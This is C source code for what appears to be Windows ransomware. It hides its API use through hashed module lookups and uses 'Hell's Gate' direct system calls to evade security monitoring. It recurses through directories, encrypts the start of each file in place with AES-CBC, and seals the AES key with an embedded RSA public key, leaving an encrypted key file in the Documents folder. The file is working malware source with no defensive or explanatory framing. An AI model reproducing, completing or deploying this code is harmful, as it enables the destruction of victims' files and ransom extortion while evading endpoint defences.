#include<windows.h>
#include <strsafe.h>
#include<wincrypt.h>
#include"aes.h"
#include"commonEnc.h"
#include <stdio.h>

#pragma comment(lib,"advapi32.lib");
#pragma comment(lib, "Crypt32.lib")


#define AES_256_KEY_SIZE  32 
#define IV_SIZE    16  

extern  VOID HellsGate(WORD wSystemCall);

extern  HellDescent();

VX_TABLE sysCall = { 0 };
HMODULE hKernel32;
HMODULE hAdvapi32;
HMODULE hNtdll;


VOID GetModules(HMODULE* hKernel32, HMODULE* hAdvapi32, HMODULE* hNtdll) {
	 *hNtdll = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"NTDLL.DLL"));
	 *hAdvapi32 = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"ADVAPI32.DLL"));
	 *hKernel32 = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"KERNEL32.DLL"));

}

VOID InitializeModules() {

	GetModules(&hKernel32,&hAdvapi32,&hNtdll);
}

WCHAR* to_uppercase(const wchar_t* input) {
	if (input == NULL)
		return NULL;

	
	size_t len = wcslen(input);
	wchar_t* result = (wchar_t*)LocalAlloc(LPTR,(len + 1) * sizeof(wchar_t));
	if (result == NULL)
		return NULL;

	
	for (size_t i = 0; i < len; i++) {
		result[i] = towupper(input[i]);
	}
	result[len] = L'\0';

	return result;
}

HMODULE GetModuleHandleH(UINT32 dllName) {

	PTEB pTeb = (TEB*)(__readgsqword(0x30));
	PPEB pPeb = pTeb->ProcessEnvironmentBlock;
	PPEB_LDR_DATA pLdr = pPeb->LoaderData;
	PLDR_DATA_TABLE_ENTRY pDte = pLdr->InMemoryOrderModuleList.Flink;

	while (pDte) {
	
		if (pDte->FullDllName.Length != 0) {
			
			UINT32 hashedDllName = HashStringJenkinsOneAtATime32BitW(to_uppercase(pDte->FullDllName.Buffer));
			if (hashedDllName == dllName){
				return (HMODULE)pDte->InInitializationOrderLinks.Flink;
			}
		}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}
	return NULL;
}

FARPROC GetProcAddressH(HMODULE hModule, LPCSTR lpProcName){

	PBYTE pBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;

	if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE){
		return NULL;
	}
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);

	PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNtHeader->OptionalHeader;
	PIMAGE_DATA_DIRECTORY pDataDirectory = &pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)pDosHeader + pDataDirectory->VirtualAddress);

	PDWORD pAddressOfFunctions = (PDWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfFunctions);
	PDWORD pAddressOfNames = (PDWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfNames);
	PWORD pAddressOfNameOrdinals = (PWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfNameOrdinals);
	for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
		LPCSTR pFunctionName = (LPCSTR)((DWORD_PTR)pDosHeader + pAddressOfNames[i]);
		if (strcmp(pFunctionName, lpProcName) == 0) {
			WORD ordinal = pAddressOfNameOrdinals[i];
			DWORD rva = pAddressOfFunctions[ordinal];
			FARPROC pFunction = (FARPROC)((DWORD_PTR)pDosHeader + rva);
			return pFunction;
		}
	}
	return NULL;
}

BOOL InitializeSysCalls() {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	sysCall.NtReadFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtReadFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtReadFile)) {
		return FALSE;
	}

	sysCall.NtWriteFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtWriteFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtWriteFile)) {
		return FALSE;
	}

	sysCall.NtCreateFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtCreateFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtCreateFile)) {
		return FALSE;
	}

	sysCall.NtClose.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtClose");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtClose)) {
		return FALSE;
	}


}

BOOL LoadNativeFunctions(PUNICODE_STRING ufileName,LPCWSTR path, OBJECT_ATTRIBUTES* objAttr) {
	
	if (!hNtdll) return FALSE;

	RtlInitUnicodeStringFunc pRtlInitUnicodeString =
		(RtlInitUnicodeStringFunc)GetProcAddressH(hNtdll, "RtlInitUnicodeString");
	if (!pRtlInitUnicodeString) return FALSE;

	// Use the function
	WCHAR fullPath[MAX_PATH];
	if (wcsncmp(path, L"\\??\\", 4) != 0) {
		wcscpy_s(fullPath, MAX_PATH, L"\\??\\");
		wcscat_s(fullPath, MAX_PATH, path);
	}
	else {
		wcscpy_s(fullPath, MAX_PATH, path);
	}
	pRtlInitUnicodeString(ufileName, fullPath);

	// Create object attributes
	objAttr->Length = sizeof(OBJECT_ATTRIBUTES);
	objAttr->RootDirectory = NULL;
	objAttr->ObjectName = ufileName;
	objAttr->Attributes = OBJ_CASE_INSENSITIVE;
	objAttr->SecurityDescriptor = NULL;
	objAttr->SecurityQualityOfService = NULL;

	return TRUE;
}

BOOL AddPadding(uint8_t* data, SIZE_T* data_len) {
	SIZE_T original_len = *data_len;
	SIZE_T padding_len = 16 - (original_len % 16);

	for (size_t i = original_len; i < original_len + padding_len; i++) {
		data[i] = (uint8_t)padding_len;
	}

	*data_len = original_len + padding_len;

	return TRUE;
}

BOOL GenerateKey(uint8_t* keyValue, uint8_t* iv) {
	
	HCRYPTPROV hProv = NULL;
	HCRYPTKEY hKey = NULL;
	BOOL bSuccess = FALSE;
	BYTE* pbBlob = NULL;

	if (!keyValue || !iv) {
		return bSuccess;
	}

	RtlSecureZeroMemory(keyValue, AES_256_KEY_SIZE);
	RtlSecureZeroMemory(iv,IV_SIZE);

	
	if (hAdvapi32 == NULL) {
		return bSuccess;
	}

	CryptAcquireContextFunc pCryptAcquireContext = (CryptAcquireContextFunc)GetProcAddressH(
		hAdvapi32,
		"CryptAcquireContextW"
	);

	if (pCryptAcquireContext == NULL) {
		return bSuccess;
	}

	if (!pCryptAcquireContext(
		&hProv,
		NULL,
		MS_ENH_RSA_AES_PROV_W,
		PROV_RSA_AES,
		CRYPT_VERIFYCONTEXT)){

		goto _EndFunction;
	}

	CryptGenKeyFunc pCryptGenKey = (CryptGenKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptGenKey"
	);

	if (pCryptAcquireContext == NULL) {
		goto _EndFunction;
	}


	if (!pCryptGenKey(
		hProv,
		CALG_AES_256,
		CRYPT_EXPORTABLE | CRYPT_NO_SALT,
		&hKey)){
		goto _EndFunction;
	}

	DWORD cbBlob = 0;

	CryptExportKeyFunc pCryptExportKey = (CryptExportKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptExportKey");

	if (pCryptExportKey == NULL) {
		return FALSE;
	}

	if (!pCryptExportKey(
		hKey,
		NULL,
		PLAINTEXTKEYBLOB,
		NULL,
		NULL,
		&cbBlob)){
		goto _EndFunction;
	}

	pbBlob = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBlob);
	if (!pbBlob) {
		goto _EndFunction;
	}

	if (!pCryptExportKey(
		hKey,
		NULL,
		PLAINTEXTKEYBLOB,
		NULL,
		pbBlob,
		&cbBlob)) {
		goto _EndFunction;
	}
	
	memcpy(keyValue, pbBlob + 12, AES_256_KEY_SIZE);
		
	CryptGenRandomFunc pCryptGenRandom = (CryptGenRandomFunc)GetProcAddressH(
		hAdvapi32,
		"CryptGenRandom"
	);

	if (pCryptGenRandom == NULL) {
		return FALSE;
	}

	
	if (!pCryptGenRandom(hProv, IV_SIZE, iv)) {
		goto _EndFunction;
	}

	bSuccess = TRUE;


_EndFunction:
	if (pbBlob) {
		RtlSecureZeroMemory(pbBlob,cbBlob);
		HeapFree(GetProcessHeap(), 0, pbBlob);
	}

	if (!bSuccess) {

		CryptDestroyKeyFunc pCryptDestroyKey = (CryptDestroyKeyFunc)GetProcAddressH(
			hAdvapi32,
			"CryptDestroyKey");
		CryptReleaseContextFunc pCryptReleaseContext = (CryptReleaseContextFunc)GetProcAddressH(
			hAdvapi32,
			"CryptReleaseContext");

		if (hKey) {
			pCryptDestroyKey(hKey);
			hKey = NULL;
		}
		if (hProv) {
			pCryptReleaseContext(hProv, 0);
			hProv = NULL;
		}
		RtlSecureZeroMemory(keyValue,AES_256_KEY_SIZE);
		RtlSecureZeroMemory(iv,IV_SIZE);
	}

	return bSuccess;
}

VOID AESencryptFile(uint8_t key[AES_256_KEY_SIZE], uint8_t iv[IV_SIZE], uint8_t plaintext[IV_SIZE]) {
	struct AES_ctx ctx;

	AES_init_ctx(&ctx, key);
	AES_ctx_set_iv(&ctx, iv);
	AES_CBC_encrypt_buffer(&ctx, plaintext, IV_SIZE);
	

	}

BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {  
	
	
	PBYTE buffer = NULL;
	DWORD numberOfBytesToRead = NULL;
	LARGE_INTEGER fileSize = { 0 };  
	BOOL bSuccess = FALSE;
	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING filePath;
	NTSTATUS STATUS = 0x00;
	HANDLE hFile = NULL;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };

	
	if (!pData || !pfilePath || !szData) {
		return bSuccess;
	}

	GetFileAttributesWFunc pGetFileAttributesW = (GetFileAttributesWFunc)GetProcAddressH(
		hKernel32,
		"GetFileAttributesW"
	);

	if (pGetFileAttributesW(pfilePath) == INVALID_FILE_ATTRIBUTES) {
		return bSuccess;
	}

	LoadNativeFunctions(&filePath,pfilePath,&objAttr);

	HellsGate(sysCall.NtCreateFile.wSystemCall);

	STATUS = HellDescent(
		&hFile,
		GENERIC_READ | SYNCHRONIZE,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);
	
	if(STATUS != 0){
		goto _EndFunction;
	}

	//hFile = CreateFileW(
	//	pfilePath,
	//	GENERIC_READ,
	//	FILE_SHARE_READ,
	//	NULL,
	//	OPEN_EXISTING,
	//	FILE_ATTRIBUTE_NORMAL,
	//	NULL
	//);

	if (hFile == INVALID_HANDLE_VALUE) {
		goto _EndFunction;
	}

	GetFileSizeExFunc pGetFileSizeEx = (GetFileSizeExFunc)GetProcAddressH(
		hKernel32,
		"GetFileSizeEx"
	);

	if (!pGetFileSizeEx(hFile, &fileSize)) {
		goto _EndFunction;
	}

	if (fileSize.QuadPart == 0) {
		goto _EndFunction;
	}

	if (fileSize.QuadPart > SIZE_MAX) {
		goto _EndFunction;
	}

	if(fileSize.QuadPart > 1024){
		numberOfBytesToRead = 1024;
	}
	else {
		numberOfBytesToRead = (DWORD)fileSize.QuadPart;
	}

	buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)numberOfBytesToRead);
	if (!buffer) {
		goto _EndFunction;
	}
		HellsGate(sysCall.NtReadFile.wSystemCall);	

		STATUS = HellDescent(
		hFile,          
		NULL,          
		NULL,         
		NULL,       
		&ioStatusBlock,
		buffer,       
		numberOfBytesToRead,           
		NULL,         
		NULL);	
		
		if(STATUS != 0 || (DWORD)ioStatusBlock.Information != numberOfBytesToRead){
		goto _EndFunction;
	}


	//if (!ReadFile(hFile, buffer, (DWORD)fileSize.QuadPart, &numberOfBytesRead, NULL) || numberOfBytesRead != (DWORD)fileSize.QuadPart) {
	//	printf("[!] ReadFile failed or incomplete read: %d\n", GetLastError());
	//	goto _EndFunction;
	//}

	*pData = buffer;
	*szData = numberOfBytesToRead;

	bSuccess = TRUE;
	buffer = NULL; 

_EndFunction:
	if (hFile) {
		HellsGate(sysCall.NtClose.wSystemCall);
		HellDescent(hFile);
	}
	if (buffer) {
		HeapFree(GetProcessHeap(), 0, buffer);
	}
	return bSuccess;
}

BOOL WriteToFile(PBYTE buffer, WCHAR* pfilePath, SIZE_T numberOfBytesToWrite) { 
	BOOL bSuccess = FALSE;  
	HANDLE hFile = NULL;
	DWORD numberOfBytesWritten = 0;
	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING filePath;
	NTSTATUS STATUS = 0x00;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };


	if (!buffer || !pfilePath || numberOfBytesToWrite == 0) {
		return FALSE;
	}


	LoadNativeFunctions(&filePath, pfilePath, &objAttr);

	HellsGate(sysCall.NtCreateFile.wSystemCall);

	STATUS = HellDescent(
		&hFile,
		GENERIC_WRITE | SYNCHRONIZE,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);

	if (STATUS != 0) {
		goto _EndFunction;
	}

	//hFile = CreateFileW(
	//	pfilePath,
	//	GENERIC_WRITE,
	//	FILE_SHARE_READ,
	//	NULL,
	//	OPEN_ALWAYS,        
	//	FILE_ATTRIBUTE_NORMAL,
	//	NULL
	//);

	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	SetFilePointerFunc pSetFilePointer = (SetFilePointerFunc)GetProcAddressH(
		hKernel32,
		"SetFilePointer"
	);

	SetEndOfFileFunc pSetEndOfFile = (SetEndOfFileFunc)GetProcAddressH(
		hKernel32,
		"SetEndOfFile"
	);
		
	if (pSetFilePointer(hFile, NULL, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		goto _EndFunction;
	}


	if (numberOfBytesToWrite < 1024) {
		if (!SetEndOfFile(hFile)) {
			goto _EndFunction;
		}
	}


	SIZE_T bytesRemaining = numberOfBytesToWrite;
	SIZE_T currentOffset = 0;
	HellsGate(sysCall.NtWriteFile.wSystemCall);

	while (bytesRemaining > 0) {
		DWORD bytesToWrite = (bytesRemaining > MAXDWORD) ? MAXDWORD : (DWORD)bytesRemaining;

		STATUS = HellDescent(
			hFile,
			NULL,
			NULL,
			NULL,
			&ioStatusBlock,
			buffer,
			(DWORD)bytesRemaining,
			NULL,
			NULL);

		if(STATUS != 0){
			goto _EndFunction;
		}


		//if (!WriteFile(hFile, buffer + currentOffset, bytesToWrite, &numberOfBytesWritten, NULL)) {
		//	printf("[!] Cannot WriteFile %d\n", GetLastError());
		//	goto _EndFunction;
		//}

		if ((DWORD)ioStatusBlock.Information != (DWORD)bytesToWrite) {
			goto _EndFunction;
		}

		bytesRemaining -= (DWORD)ioStatusBlock.Information;
		currentOffset += (DWORD)ioStatusBlock.Information;
	}

	bSuccess = TRUE;

_EndFunction:
	if (hFile) {
		HellsGate(sysCall.NtClose.wSystemCall);
		STATUS = HellDescent(hFile);
	}
	return bSuccess;
}

BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {

	PBYTE pData = NULL;
	SIZE_T szData = NULL;
	WCHAR* filePath = (WCHAR*)LocalAlloc(LPTR,MAX_PATH * sizeof(WCHAR));

	WCHAR searchPattren[MAX_PATH * sizeof(WCHAR)];
	WIN32_FIND_DATA fileData;
	DWORD dwError = NULL;

	StringCchCopy(searchPattren, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
	StringCchCat(searchPattren, MAX_PATH * sizeof(WCHAR), L"\\*");

	if (hKernel32 == NULL) {
		return 1;
	}

	FindFirstFileWFunc pFindFirstFileW = (FindFirstFileWFunc)GetProcAddressH(hKernel32,"FindFirstFileW");

	FindNextFileWFunc pFindNextFileW = (FindNextFileWFunc)GetProcAddressH(hKernel32,"FindNextFileW");
	
	FindCloseFunc pFindClose = (FindCloseFunc)GetProcAddressH(hKernel32,"FindClose");

	if (pFindClose == NULL) {
		return FALSE;
	}


	if (pFindFirstFileW == NULL || pFindNextFileW == NULL) {
		return FALSE;
	}

	HANDLE hSearch = pFindFirstFileW(searchPattren, &fileData);
	if (hSearch == INVALID_HANDLE_VALUE) {
		return FALSE;
	}



	do {
		if (wcscmp(fileData.cFileName, L".") == 0 || wcscmp(fileData.cFileName, L"..") == 0) {
			continue;
		}
		if (wcscmp(fileData.cFileName, L"AES_key") == 0 || wcscmp(fileData.cFileName, L"IV") == 0 || wcscmp(fileData.cFileName, L"desktop.ini") == 0) {
			continue;
		}
		StringCchCopy(filePath, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), L"\\");  // Fix here
		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), fileData.cFileName);


		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {


			if (!DirectoryFiles(filePath,key,iv)) {
				continue;
			}
		}
		else {

			if (!ReadFromFile(&pData, filePath, &szData)) {
				continue;
			}

			SIZE_T count = { 0 };
			SIZE_T szplaintext = 0;
			uint8_t plaintext[16];
			uint8_t* encryptedData = NULL;
			SIZE_T totalEncryptedSize = 0;
			uint8_t* tempBuffer = NULL;


			while (count< szData) {
				RtlSecureZeroMemory(plaintext,16);
				SIZE_T szplaintext = (count + 16 <= szData) ? 16 : szData - count;
				for (int i = 0; i < 16; i++) {
					if (count < szData) {
						plaintext[i] = pData[count];
						count++;
					}
					else break;
				}

				if(count >= szData && szData % 16 != 0 ){
					if (!AddPadding(plaintext, &szplaintext)) {
						if (pData) LocalFree(pData);
						if (encryptedData) LocalFree(encryptedData);
						return FALSE;
					}
				}

				tempBuffer = (uint8_t*)realloc(encryptedData, totalEncryptedSize + szplaintext);
				if (!tempBuffer) {
					if (pData) LocalFree(pData);
					if (encryptedData) free(encryptedData);
					return FALSE;
				}
				encryptedData = tempBuffer;

				AESencryptFile(key, iv, plaintext);

				memcpy(encryptedData + totalEncryptedSize, plaintext, szplaintext);
				totalEncryptedSize += szplaintext;

			}

			if (!WriteToFile(encryptedData, filePath, totalEncryptedSize)) {
				if (pData) LocalFree(pData);
				if (encryptedData) LocalFree(encryptedData);
				return FALSE;
			}

		}

	} while (pFindNextFileW(hSearch, &fileData) != 0);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		return FALSE;
	}
	pFindClose(hSearch);
	return TRUE;
}

BOOL ImportPubkey(HCRYPTPROV* hCryptProv,HCRYPTKEY* hKey) {

	BYTE serverPublicKey[] = {
	0x06, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00,
	0x01, 0x00, 0x01, 0x00, 0xD1, 0x75, 0xA3, 0x89, 0x7E, 0x64, 0xD3, 0xD6, 0x48, 0xF5, 0x84, 0xC2,
	0xC2, 0x22, 0x41, 0x61, 0x8F, 0xBC, 0xB4, 0x66, 0x4E, 0xF7, 0x2D, 0x3F, 0x57, 0xAF, 0xB8, 0x93,
	0xF9, 0xB6, 0x00, 0x9E, 0x19, 0x20, 0xE4, 0xE4, 0x6C, 0x25, 0xE8, 0xA7, 0x95, 0xAE, 0x96, 0x42,
	0x67, 0x3B, 0xC9, 0xE3, 0x0C, 0x8A, 0x5A, 0x9F, 0x06, 0x38, 0x19, 0xC0, 0x51, 0x6F, 0x08, 0xB8,
	0x23, 0x5B, 0x2D, 0xD2, 0x1A, 0xD6, 0x14, 0x4D, 0x7D, 0x6E, 0xEF, 0x32, 0xDD, 0xBE, 0xE2, 0xB7,
	0x08, 0x25, 0x02, 0xD4, 0x4A, 0x91, 0x9A, 0x6F, 0xE9, 0xFF, 0x9A, 0x4C, 0xB8, 0x64, 0x00, 0x38,
	0x0B, 0xB4, 0x1C, 0x9B, 0xE5, 0xCA, 0xE9, 0xBC, 0x7B, 0xBE, 0xF6, 0x4C, 0x4A, 0x3B, 0x92, 0x6F,
	0xBB, 0x4B, 0x3F, 0x3E, 0x6B, 0x5F, 0x17, 0x67, 0xA6, 0x95, 0xB4, 0xB7, 0x40, 0x02, 0xE3, 0xA2,
	0xA5, 0xA9, 0x5E, 0xBF };



	CryptAcquireContextFunc pCryptAcquireContext = (CryptAcquireContextFunc)GetProcAddressH(
		hAdvapi32,
		"CryptAcquireContextW"
	);

	if (pCryptAcquireContext == NULL) {
		return FALSE;
	}


	if (!pCryptAcquireContext(hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
		return FALSE;
	}


	CryptImportKeyFunc pCryptImportKey = (CryptImportKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptImportKey"
	);

	if (pCryptImportKey == NULL) {
		return FALSE;
	}


	if (!pCryptImportKey(*hCryptProv, serverPublicKey, sizeof(serverPublicKey), 0, CRYPT_EXPORTABLE, hKey)) {
		return FALSE;
	}

	return TRUE;
}

BOOL EncryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize,PBYTE* cipher) {
	
	DWORD cipherTextLen = (DWORD)(*keySize);
	DWORD dataLen = 0;
	PBYTE pbBlob = NULL;


	CryptEncryptFunc pCryptEncrypt = (CryptEncryptFunc)GetProcAddressH(
		hAdvapi32,
		"CryptEncrypt"
	);

	if (!pCryptEncrypt(hKey, NULL, TRUE, 0, NULL, &cipherTextLen, 0)) {
		return FALSE;
	}

	pbBlob = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cipherTextLen);
	if (!pbBlob) {
		return FALSE;
	}

	memcpy(pbBlob, key, *keySize);
	dataLen = (DWORD)*keySize;

	if (!pCryptEncrypt(hKey, NULL, TRUE, 0, pbBlob, &dataLen, cipherTextLen)) {
		HeapFree(GetProcessHeap(), 0, pbBlob);
		return FALSE;
	}

	*keySize = dataLen;
	*cipher = pbBlob;
	

	return TRUE;
}

BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
	

	HCRYPTPROV hProv = 0;
	HCRYPTKEY serverHandlePKey = 0;
	SIZE_T szEncAESKey = AES_256_KEY_SIZE;
	SIZE_T szPublicKey = 0;
	PBYTE publicKey = NULL;
	PBYTE encAESKey = NULL;
	BOOL result = FALSE;
	WCHAR AESkeyPath[MAX_PATH] = { 0 };

	if (keyPath == NULL) {
		return FALSE;
	}


	CryptDestroyKeyFunc pCryptDestroyKey = (CryptDestroyKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptDestroyKey");
	CryptReleaseContextFunc pCryptReleaseContext = (CryptReleaseContextFunc)GetProcAddressH(
		hAdvapi32,
		"CryptReleaseContext");

	lstrcpy(AESkeyPath, keyPath);

	if (FAILED(StringCchCat(AESkeyPath, MAX_PATH, L"\\Documents\\AES_key"))) {
		return FALSE;
	}


	if (!ImportPubkey(&hProv,&serverHandlePKey)) {
		goto _EndFucntion;
	}

	if (!EncryptAESKey(serverHandlePKey, (PBYTE)keyValue, &szEncAESKey, &encAESKey)) {
		goto _EndFucntion;
	}

	if (!WriteToFile(encAESKey, AESkeyPath, szEncAESKey)) {
		goto _EndFucntion;
	}

	result = TRUE;

_EndFucntion:

	if (serverHandlePKey) pCryptDestroyKey(serverHandlePKey);
	if (hProv) pCryptReleaseContext(hProv, 0);

	if (publicKey) {
		SecureZeroMemory(publicKey, szPublicKey);
		HeapFree(GetProcessHeap(), 0, publicKey);
	}

	if (encAESKey) {
		HeapFree(GetProcessHeap(), 0, encAESKey);
	}

	return result;
}
